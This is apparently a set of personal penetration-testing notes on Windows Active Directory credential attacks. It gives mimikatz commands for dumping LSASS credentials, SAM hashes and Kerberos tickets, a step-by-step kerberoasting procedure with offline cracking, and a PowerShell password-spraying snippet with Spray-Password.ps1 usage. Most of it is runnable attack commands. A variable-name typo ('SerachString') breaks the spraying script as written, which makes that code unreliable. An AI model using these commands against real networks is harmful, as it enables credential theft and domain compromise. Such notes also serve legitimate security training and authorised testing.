
to display all cashed credintials stored on the LSASS:

we will use MIMIKATZ to retrive hashes and tickets:

	privilege::debug

	sekurlsa::logonpasswords   

	sekurlsa::tickets
------------------------------------------
another way to let mimikatz dump the hashes is:

	privilege::debug

	token::elevate

	lsadump::sam

===================================================================================================================

{{{ kerberoasting }}}

Service Accout Attack, if we want to attack a certain service running on the target to have its admin password:


first we request the TGS for any service like IIS from KDC as the following:

	Add-Type -AssemblyName System.IdentityModel

	New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/DC.tshoot.com'

then display all cashed kerbros tickets we use : 
	
	klist
or	
	mimikatz
	sekurlsa::tickets

then to download the service ticket we use mimikatz:

	kerberos::list /export

then we can decrypt the the ticket using john or hashcat or kerberoast python script (tgsrepcrack):

	sudo apt install kerberoast

	python /usr/share/kerberoast/tgsrepcrack wordlist.txt ticketfile.txt

!note : Invok-kerberoast.ps1 script enumerate all services and get them ready to crack with JTR and hashcat



===================================================================================================================

to perform slow password guessing we first see the accounts policy:

	net accounts

then we can use the following script to try passwords along side with usernames:

	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

	$PDC = ($domainObj.PdcRoleOwner).Name

	$SerachString = "LDAP://"

	$SearchString += $PDC + "/"

	$DistinguishedName = "DC=$($domainObj.Name.Replace('.',',DC='))"

	$SearchString += $DistinguishedName

	New-Object System.DirectoryServices.DirectoryEntry($SearchString , "username", "password")


but there is powershell script ready for this operation called "Spray-Password.ps1":

	.\spray-password.ps1 -Pass <password> -Admin
	.\spray-password.ps1 -File <wordlist> -Admin













